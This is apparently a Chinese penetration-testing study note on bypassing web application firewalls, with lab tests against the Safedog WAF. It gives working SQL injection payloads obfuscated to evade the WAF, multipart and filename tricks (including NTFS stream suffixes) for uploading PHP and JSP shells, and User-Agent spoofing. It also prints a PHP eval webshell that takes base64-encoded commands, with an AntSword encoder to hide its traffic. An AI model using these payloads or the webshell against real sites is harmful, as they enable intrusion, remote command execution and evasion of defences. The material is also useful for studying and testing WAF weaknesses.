---
title: WAF绕过学习
date: 2023/6/26 19:50:25
categories:
- 渗透测试
tags:
- WAF绕过
---



#  知己知彼

[WAF功能介绍（入门扫盲篇） - 一觉醒来写程序 - 博客园](https://www.cnblogs.com/realjimmy/p/12937247.html)

## WAF的工作流程

- **预处理**

  - 网络层过滤：IP黑白名单

    > 由于HTTP是应用层的协议，每次WAF都要解析它，会造成很大性能损耗。而对于某些经常发恶意请求的IP或进行CC攻击的IP，如果能够在网络层就把它们拦截了，对WAF性能是有很大的提升。

  - 应用层过滤：在接收到数据请求流量时会先判断是否为HTTP/HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。

- **规则检测**

  解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。

- **处理模块**

  针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。

- **日志记录**

  WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。



## WAF分类

![image-20230516142728508](../images/image-20230516142728508.png)

本文以安全狗为例子进行简单学习



## WAF部署位置

![enter image description here](../images/2015081104292360563.png)

```
请求 → CDN → 云waf → 硬waf → WEB服务器 → 软waf → WEB应用程序（代码waf） → (数据库)
```





# 储备知识

```
waf了解
编码和编程语言函数
http协议
web服务器特性
互联网标准文档RFC
```



# 常见绕过手法

![QQ截图20231017125131](../images/QQ截图20231017125131.jpg)

## 迂回作战类

> 主打一个侧面绕过，利用各种缺陷和特性使得**waf没有解析到payload**，而后端可以正常解析，不与waf的规则和策略硬刚。



### Web服务器特性

> Web服务器解析与waf解析不同绕过

#### IIS+ASP

- `%`

  ```
  对于URL请求的参数值中的%，如果和后面的字符构成的字符串在URL编码表之外，ASP脚本处理时会将其忽略。
  
  select  →  se%lect
  ```

- `unicode`

  ```
  IIS会自动解码unicode
  ```



#### HPP--参数污染

传递多个相同参数，利用waf和web服务器解析的参数不同来进行绕过

| Web 环境         | 参数获取函数                | 获取到的参数     |
| :--------------- | :-------------------------- | :--------------- |
| PHP/Apache       | $_GET("par")                | last             |
| JSP/Tomcat       | Request.getParameter("par") | first            |
| Perl(CGI)/Apache | Param("par")                | first            |
| Python/Apache    | getvalue("par")             | ["first","last"] |
| ASP.NET/IIS      | Request.QueryString("par")  | first,last       |



#### 畸形请求头

- Web服务器可以解析畸形请求头，但是Waf不能解析畸形请求头

- 都不能解析畸形请求头，利用Web服务器的解析流程

  比如shiro的一个绕过方式，使用畸形请求头来绕过waf。因为shiro是先处理cookie，然后请求到servlet被解析，所以rememberMe值是会处理的。

  

  

### 后端语言特性

> 后端代码解析与waf解析不同
>
> **waf没有根据后端代码来修改策略和规则**

#### 编码

对请求数据进行编码，例如url编码，Unicode编码，Base64编码等，如果waf对数据不能有效的解码，而应用后端能够正常解码，就可以绕过waf。

比如

- Json数据支持Unicode编码

- Base64编码

  ![image-20230909230652318](../images/image-20230909230652318.png)

  ​	![image-20230909230621472](../images/image-20230909230621472.png)

- JSP支持多重Unicode编码

- java支持的编码

  ```java
  //res
  {"Big5","Big5-HKSCS","CESU-8","EUC-JP","EUC-KR","GB18030","GB2312","GBK","IBM-Thai","IBM00858","IBM01140","IBM01141","IBM01142","IBM01143","IBM01144","IBM01145","IBM01146","IBM01147","IBM01148","IBM01149","IBM037","IBM1026","IBM1047","IBM273","IBM277","IBM278","IBM280","IBM284","IBM285","IBM290","IBM297","IBM420","IBM424","IBM437","IBM500","IBM775","IBM850","IBM852","IBM855","IBM857","IBM860","IBM861","IBM862","IBM863","IBM864","IBM865","IBM866","IBM868","IBM869","IBM870","IBM871","IBM918","ISO-2022-CN","ISO-2022-JP","ISO-2022-JP-2","ISO-2022-KR","ISO-8859-1","ISO-8859-13","ISO-8859-15","ISO-8859-2","ISO-8859-3","ISO-8859-4","ISO-8859-5","ISO-8859-6","ISO-8859-7","ISO-8859-8","ISO-8859-9","JIS_X0201","JIS_X0212-1990","KOI8-R","KOI8-U","Shift_JIS","TIS-620","US-ASCII","UTF-16","UTF-16BE","UTF-16LE","UTF-32","UTF-32BE","UTF-32LE","UTF-8","windows-1250","windows-1251","windows-1252","windows-1253","windows-1254","windows-1255","windows-1256","windows-1257","windows-1258","windows-31j","x-Big5-HKSCS-2001","x-Big5-Solaris","x-COMPOUND_TEXT","x-euc-jp-linux","x-EUC-TW","x-eucJP-Open","x-IBM1006","x-IBM1025","x-IBM1046","x-IBM1097","x-IBM1098","x-IBM1112","x-IBM1122","x-IBM1123","x-IBM1124","x-IBM1166","x-IBM1364","x-IBM1381","x-IBM1383","x-IBM300","x-IBM33722","x-IBM737","x-IBM833","x-IBM834","x-IBM856","x-IBM874","x-IBM875","x-IBM921","x-IBM922","x-IBM930","x-IBM933","x-IBM935","x-IBM937","x-IBM939","x-IBM942","x-IBM942C","x-IBM943","x-IBM943C","x-IBM948","x-IBM949","x-IBM949C","x-IBM950","x-IBM964","x-IBM970","x-ISCII91","x-ISO-2022-CN-CNS","x-ISO-2022-CN-GB","x-iso-8859-11","x-JIS0208","x-JISAutoDetect","x-Johab","x-MacArabic","x-MacCentralEurope","x-MacCroatian","x-MacCyrillic","x-MacDingbat","x-MacGreek","x-MacHebrew","x-MacIceland","x-MacRoman","x-MacRomania","x-MacSymbol","x-MacThai","x-MacTurkish","x-MacUkraine","x-MS932_0213","x-MS950-HKSCS","x-MS950-HKSCS-XP","x-mswin-936","x-PCK","x-SJIS_0213","x-UTF-16LE-BOM","X-UTF-32BE-BOM","X-UTF-32LE-BOM","x-windows-50220","x-windows-50221","x-windows-874","x-windows-949","x-windows-950","x-windows-iso2022jp"}
  ```

  

#### 多数据来源

web应用程序从多个地方取值，如

```php
# php
$param = $_SERVER['xxxx']
```

可以从`GET,POST,HEADER,METHOD`等地方获取用户提交的参数。

如果waf只对`GET，POST`进行检测,没有与后端相适应，就可以绕过。





### HTTP协议

#### 分块传输

Burp插件：https://github.com/c0ny1/chunked-coding-converter

```php
Transfer-Encoding: chunked  # 表示BODY的传输编码方式为chunked（无Content-Length字段）

3 # 指明传输的数据长度
a=1
0 # 表示传输结束
```



#### keep-alive

http长连接，发送多个数据包请求，感觉跟请求走私很像

```http
Connection: Keep-Alive
```

需要关闭

![image-20230517113339255](../images/image-20230517113339255.png)



#### multipart/form-data

> Multipart所以使用请求与普通的GET/POST参数传输有非常大的区别，因为Multipart请求需要后端Web应用解析该请求包，Web容器也不会解析Multipart请求。WAF可能会解析Multipart但是很多时候可以直接绕过，比如很多WAF无法处理一个数据量较大的Multipart请求或者解析Multipart时不标准导致绕过。

![image-20231020182537916](../images/image-20231020182537916.png)

更多关于`multipart/form-data`的绕过思路：[月影斑驳--do9gy's blog (moonslow.com)](http://www.moonslow.com/article/tencent_waf_bypass)



#### chrest编码

```http
content-type: charest=cp037
```

```
ibm869
ibm870
ibm871
ibm918
iso-2022-cn
iso-2022-jp
iso-2022-jp-2
iso-2022-kr
iso-8859-1
iso-8859-13
iso-8859-15
```

脚本

```python
import urllib.parse 
payload = '<script>alert("xss")</script>' 
print(urllib.parse.quote_plus(payload.encode("IBM037" )))
```



```http
Accept-Encoding: 
Accept-Encoding: gzip
Accept-Encoding: compress
Accept-Encoding: deflate
Accept-Encoding: br
Accept-Encoding: identity
Accept-Encoding: *
```



### waf特性

> 部署方式，策略与规则缺陷

#### 云waf

![img](../images/zh-cn_image_0000001193876233.png)

通过CNAME接入将网站域名添加到WAF后，网站所有的业务流量将被引流到WAF进行检测。WAF过滤Web应用攻击后，将正常的业务流量转发回源站服务器，从而保障网站的业务安全和数据安全。此时，WAF作为一个反向代理集群，同时参与流量的检测和转发。

![CNAME接入](../images/p613782.png)所以如果可以找到目标的真实ip，就可以绕过云waf。

像下面这样的是不行的

> 云wafPing出来是这种的hlpqjurlppnsnvzs72xcfxxxxx7htyxpit3c39.yundunwaf3.com
>
> 虽然也有真实IP，但是域名走的waf解析，不允许IP直接访问





#### 性能缺陷

##### 脏数据

为了防止消耗太多的CPU、内存资源，因此许多WAF只检测前面的2M或4M的内容。所以可以通过填充垃圾数据进行绕过。



##### 静态文件绕过

一些 WAF 为了减少服务器的压力，会对静态文件如`.png`、`.css`等直接放行，那么我们可以尝试伪装成静态文件来绕过

```php
# 原来被拦截
http://a.a/?id=123 and 2*3=6
# 现在不拦截
http://a.a/?1.jpg&id=123 and 2*3=6
```



##### 高并发

用Burp的`Trubo Intruder`插件,失败

而且高并发很可能会造成业务系统出现问题。

一个成功的案例https://zone.huoxian.cn/d/113



#### 白名单机制

- 文件白名单

  > 一些 WAF 为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。
  >
  > 如：WAF 设立了白名单`/admin`，那么我们的测试 payload 可以通过如下的手法来绕过

  ```php
  # 原来被拦截
  http://a.a/?id=123 and 2*3=6
  # 现在不拦截
  http://a.a/?a=/admin&id=123 and 2*3=6
  ```

- IP白名单

  > 后端通过Header字段获取源IP

  ```http
  X-FORWARDED-FOR等
  ```

- UA白名单

  > 某些WAF可能为了不影响站点的SEO优化，将User-Agent为某些搜索引擎（如谷歌）的请求当作白名单处理，不检测和拦截。

  ```http
  # 百度搜索老版UA
  Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
  
  # 百度图片老版UA
  Baiduspider-image+(+http://www.baidu.com/search/spider.htm)
  
  # 新版PC
  Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)
  
  # 新版WAP
  Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)
  
  # 360搜索
  Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0);
  
  # 360网站安全检测
  360spider (http://webscan.360.cn)
  
  # Google
  Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
  
  # Adwords移动网络
  Googlebot-Image/1.0
  
  # Adwords移动网络
  AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 0 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari
  
  # 微软 bing，必应
  Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
  
  # 搜狗搜索
  Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)
  ```
  



#### 请求方式

1. 一些 WAF 对于`get`请求和`post`请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给`GET`请求变成`POST`请求有可能绕过拦截。
2. 一些 WAF 检测到`POST`请求后，就不会对`GET`携带的参数进行过滤检测，因此导致被绕过。







## 正面硬刚类

> 增增改改混淆视听，使waf的规则和策略失效
>
> **基本方针**：
>
> 1. 增删测试waf容忍度，确认关键点
> 2. FUZZ PAYLOAD,先保证可以绕过检测
> 3. 再次进行构造使得后端能够进行解析



### FUZZ大法

> fuzz大法，使用脚本去探测WAF设备对于字符处理是否有异常，一些WAF可能由于自身的解析问题，对于某些字符解析出错，造成全局的bypass

测试点

```http
1）：get请求处 
2）：header请求处 
3）：post urlencode内容处 
4）：post form-data内容处
```

基础内容

```http
1）编码过的0-255字符 
2）进行编码的0-255字符 
3）utf gbk字符
```





# 实验环境--安全🐕

没有在代码中进行过滤，如有会说明。

```
win  10
php  5.6.9
mysql 5.7.26
apache 2.4.39
safe dog V3.5 
```

配置如下，除了CC攻击，全防护

![image-20230516235356524](../images/image-20230516235356524.png)

![image-20230516150636839](../images/image-20230516150636839.png)

特征

![image-20230517003655268](../images/image-20230517003655268.png)

![image-20230517100649383](../images/image-20230517100649383.png)

# sql注入绕过

## 多参数来源实验

```php
$_REQUEST['id'] 失败
$_POST['id'] 成功
```



## 脏数据实验

```sql
POST
id=1 union select 1,2,3%23
```

![image-20230516150951130](../images/image-20230516150951130.png)

安全🐕在`HTTP BODY`中检测到了关键字，直接返回500。。



```sql
POST
a=8172*A&id=-1 union select 1,2,3%23
```

![image-20230516151625299](../images/image-20230516151625299.png)

### 注意

`waf`可能直接检测长度来拦截

如安全🐕,`GET`下是不行的

![image-20230516151807403](../images/image-20230516151807403.png)



## 分块传输实验

成功，图没截。。

## 正面绕过

简单fuzz

![image-20230517001306283](../images/image-20230517001306283.png)

可以发现不会对单一的关键字进行过滤，会对一些组合进行过滤

### `union select`绕过

```mysql
union (select)
UNiOn/*/1/*/select
UNiOn--+%02%0d%0aselect    #注释换行
```

```sql
?id=-1 UNiOn/**/select 1,2,3#
```

![image-20230516154023102](../images/image-20230516154023102.png)

```sql
?id=-1 UNiOn/*/1/*/select 1,2,3#
```

![image-20230516154137250](../images/image-20230516154137250.png)

在`/**/`中插入`/x/`即可，x至少为一个字符

### 函数绕过

```sql
?id=-1 union/*/1/*/select 1,2,database()--+
```

![image-20230516221518813](../images/image-20230516221518813.png)

```sql
?id=-1 union/*/1/*/select 1,2,database/**/()--+
```

![image-20230516221551123](../images/image-20230516221551123.png)

FUZZ结果

![image-20230517000942363](../images/image-20230517000942363.png)

![image-20230517000931846](../images/image-20230517000931846.png)

### `select from`

硬刚G

```
分块传输，脏数据等成功
```



# 文件上传绕过

## waf检测内容

```
请求的url
Boundary边界
MIME类型
文件后缀名
文件头
文件内容
访问流量
```



## 文件上传数据包了解

```php
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl

------WebKitFormBoundary9zWBDx6vAJHGTpAl
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php
phpinfo();?>

------WebKitFormBoundary9zWBDx6vAJHGTpAl
Content-Disposition: form-data; name="submit"

submit
------WebKitFormBoundary9zWBDx6vAJHGTpAl--
```

```php
boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl 定义了BODY中的分界线(因为是谷歌浏览器，所以分界线为----WebKitFormBoundary加上随机字符串)

--boundary # 开始标志
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png
 
文件内容
--boundary   # 每两个分界线之间是具体的内容：文件上传，post传参
Content-Disposition: form-data; name="submit"

POST内容
--boundary--  # 结束标志
```



## 文件上传绕过手法

### 绕过后缀

#### Content-Type

```php
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl
   
Content-Type: multipart/XXXXXX; boundary=----WebKxxxxx
Content-Type: multipart/; boundary=----WebKxxxxx 
增加多个boundary
php：可以在boundary前后添加任意字符
大小写
boundary=boundary=a
```

#### Content-Disposition

```php
Content-Disposition: form-data; name="upload_file"; filename="shell.php"

大小写
    
# Content-Disposition   
Content-Disposition 任意位置换行,空格，脏数据溢出
多个Content-Disposition
form-data删除，改为*

# filename    
多个filename，多个;
文件名单双引号数量
filename字符左右可以加上一些空白字符%20 %09 %0a %0b %0c %0d %1c %1d %1e %1f
插入转义字符


content-type（增删，设置charset）
    
多个BODY
多个boundary
交换name和filename的顺序
    
排列组合
```

#### Windows

##### NTFS 流

[文件流 (本地文件系统) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams)

fuzz可以的

```shell
::$DATA
::$INDEX_ALLOCATION
```

![20171227163716-2507a226-eae1-1](../images/20171227163716-2507a226-eae1-1.png)

![image-20230517195752567](../images/image-20230517195752567.png)

##### 文件名

```php
文件名尾加任意个. 或者任意个空格（对文件名无影响）

windows文件名的保留字符（不允许出现）
\/:*?" <>|
可以尝试在文件名后加上这些字符
```

```
当filename=shell.php:.jpg
结果：
可以上传shell.php，但是会吃掉文件内容。。。
其他的要不不可以，可以的话，上传的文件名为.jpg
```



![image-20230517155239619](../images/image-20230517155239619.png)

##### 文件名长度

截断超长文件名

windows文件名

![image-20230618171438236](../images/image-20230618171438236.png)

linux文件名：linux中文件名最长为255字符，文件路径最大长度为4096字符

如果后端脚本没有限制上传文件名长度，可以通过多次测试，上传名为aaaaa…(200+).php.jpg，把最后的.jpg挤出去。



### 绕过文件内容检测--免杀

- waf检测

```
内容、创建日期、文件大小、通信流量特征
```

```
对于静态引擎的绕过，可以通过拆分关键词、
加入能够引发解析干扰的畸形字符等;

而对于动态引擎，需要分析它跟踪了哪些输入
点，又是如何跟踪变量的，最终是在哪些函数的哪些参数命中了恶意样本规则
```

[简单理解污点分析技术 | K0rz3n's Blog](https://www.k0rz3n.com/2019/03/01/简单理解污点分析技术/)

```
另类的入口
各种混淆（编码加密，进制转换，反序列化...）
符号干扰，绕过正则，拼接null,\n,\r,\t等
信息差绕过（加入外部因素后才是webshel，量子WEBshell😋）比如截取文件名，目录名，传入随机数种子等
```

- 传统webshell


学习：

[WebShell通用免杀的思考 - 腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1625439)

https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md

https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/

代码审计知识星球

收集：

https://github.com/tennc/webshell





### 绕过流量检测--特征/通信加密

```
弱特征：HTTP Header
request和response内容
```

参考之前HW看的文章

- 哥斯拉

  [【原创】哥斯拉Godzilla加密流量分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/285693.html)

- 冰蝎

  [利用动态二进制加密实现新型一句话木马之Java篇 - 先知社区](https://xz.aliyun.com/t/2744)

  [冰蝎V4.0流量分析到攻防检测 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/195173.html)

  [冰蝎4.0自定义加密 - 先知社区](https://xz.aliyun.com/t/12453)

- 蚁剑

  https://www.yuque.com/antswordproject/antsword/yuakxl

  

## 安全🐕检测内容

- 不允许php后缀上传

- 上传时，不检查文件内容

- 访问时，不允许访问含有恶意内容的php文件

  

## 部分成功的

### 后缀绕过

waf是解析最后一个参数，最后一个;后面的，但是如果最后一个；后面没有参数，

后端就取前一个,waf识别到空

```php
filename=shell.php;
```

![image-20230517144614924](../images/image-20230517144614924.png)

```php
filename='shell.php'; # 双引号不行
```

![image-20230517144541805](../images/image-20230517144541805.png)

```php
Content-Disposition: form-data; name="upload_file";filename=shell.php

除了shell.php处，其他地方加换行，或脏数据都可
```

![image-20230517145839048](../images/image-20230517145839048.png)

删除`content-type`

![image-20230517153416749](../images/image-20230517153416749.png)

增加`boundary`

![image-20230517175433650](../images/image-20230517175433650.png)



安全🐕+代码白名单（后缀只允许图片）

上面任意一个绕过（除了；绕过）+

```
filename=shell.php::$DATA.jpg
```



### 内容检测绕过

安全🐕的内容检测随便改一下就过了。

```php
<?php
class test
{
    function __construct($cmd){
        @eval($cmd);
    }
}
$cmd=$_POST['a'];
// $cmd = base64_decode($_POST[1]);
$foo = new test($cmd);
?>
```





### 流量检测绕过

```php
system("xxx") #命令执行限制
```

![image-20230517211700124](../images/image-20230517211700124.png)

对流量进行一个`base64`加密即可

`webshell`

```php
<?php
class test
{
    function __construct($cmd){
        @eval($cmd);
    }
}
$cmd=$_POST['a'];
$cmd = base64_decode($_POST[1]);
$foo = new test($cmd);
?>
```

蚁剑

编码器

```php
data[pwd] = Buffer.from(data['_']).toString('base64');
```

选择编码器

![image-20230517211627163](../images/image-20230517211627163.png)



# JAVA文件上传绕过补充

## commons-fileupload组件--QP编码

org.apache.commons.fileupload对传入的值进行了`MimeUtility.decodeText`操作

为了符合[RFC 2047](https://www.rfc-editor.org/rfc/rfc2047)规范会将

1. 要求以`=?`开头
2. 之后要求还要有一个`?`，中间的内容为编码，也就是`=?charset?`
3. 获取下一个`?`间的内容，这里与下面的编解码有关
4. 之后定位到最后一个`?=`间内容执行解码

例子

```bash
=?gbk?Q?=31=2e=6a=73=70?=
```

`B`，`Q`，分别对应`Base64`以及`Quoted-printable`编码

> Quoted-printable将任何8-bit字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值。例如，ASCII码换页符（十进制值为12）可以表示为”=0C”， 等号”=”（十进制值为61）必须表示为”=3D”，gb2312下“中”表示为=D6=D0

Payload

```tex
boundary==?gbk?Q?=2d=2d=2d=2d=57=65=62=4b=69=74=46=6f=72=6d=42=6f=75=6e=64=61=72=79=54=79=42=44=6f=4b=76=61=6d=4e=35=38=6c=63=45=77?=

解码后
boundary=----WebKitFormBoundaryTyBDoKvamN58lcEw
```

![img](../../../images/14.png)

解码时只会提取`=??=`之间的内容，所以可以在最后插入混淆字符

![img](../../../images/16.png)

处理过程中还有对` \t\r\n`的处理

可以将文件名拆分并插入\t\r\n

![img](../../../images/18.png)

## Tomcat与Spring文件上传

如果首位是`"`(前提条件是里面有`\`字符)，那么就会去掉`"`，从第二个字符开始取值，并且末尾也会往前移动一位，同时会忽略字符`\`

```http
filename="y4\.jspZ
filename="1.txt\".jsp"
```

![img](../../../images/10.png)

```http
Content-Disposition: form-data*;;;;;;;;;;name*="UTF-16BE'Y4tacker'%00d%00e%00p%00l%00o%00y%00W%00a%00r";;;;;;;;filename*="UTF-16BE'Y4tacker'%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K"

# Spring5支持的编码UTF-8/ISO-8859-1/US_ASCII
filename*=utf8'das'1.jsp
filename*=utf8"das"1.jsp
filename*=utf8"das"1.jsp;sd=1
filename*="utf8'das'1.jsp"
filename*="utf8'das'1.jsp";;;;asdsad;
# 再加url编码
filename*=utf8"das"1.js%70;sd=1

filename=1.jsp;.txt;
filename="1.txt".jsp;txt;

# 多个filename组合绕过
filename="1.txt";filename*="UTF-8"'sad'%32%2e%6a%73%70 #%32%2e%6a%73%70→2.jsp
z="filename="1.jsp"";filename="1.txt"
z="filename=1.jsp;";filename="1.txt"
```



# Druid SQL

https://www.cnblogs.com/HighnessDragonfly/p/14821624.html

https://www.modb.pro/db/587040



# 参考文章

https://xz.aliyun.com/t/12684

[我的WafBypass之道（SQL注入篇） - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/368)

[文件上传绕过思路总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10515)

[Bypass WAF Cookbook - MayIKissYou (wooyun.js.org)](https://wooyun.js.org/drops/Bypass WAF Cookbook.html)

[WAF是如何被绕过的？-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/203880)

[玄武盾的几种绕过姿势 - 先知社区](https://xz.aliyun.com/t/11607#toc-1)

[Java文件上传大杀器-绕waf(针对commons-fileupload组件) | Y4tacker's Blog](https://y4tacker.github.io/2022/02/25/year/2022/2/Java文件上传大杀器-绕waf(针对commons-fileupload组件)/)

[探寻Tomcat文件上传流量层面绕waf新姿势 | Y4tacker's Blog](https://y4tacker.github.io/2022/06/19/year/2022/6/探寻Tomcat文件上传流量层面绕waf新姿势/#Spring5)

[探寻Java文件上传流量层面waf绕过姿势系列二 | Y4tacker's Blog](https://y4tacker.github.io/2022/06/21/year/2022/6/探寻Java文件上传流量层面waf绕过姿势系列二/#灵活的parseQuotedToken)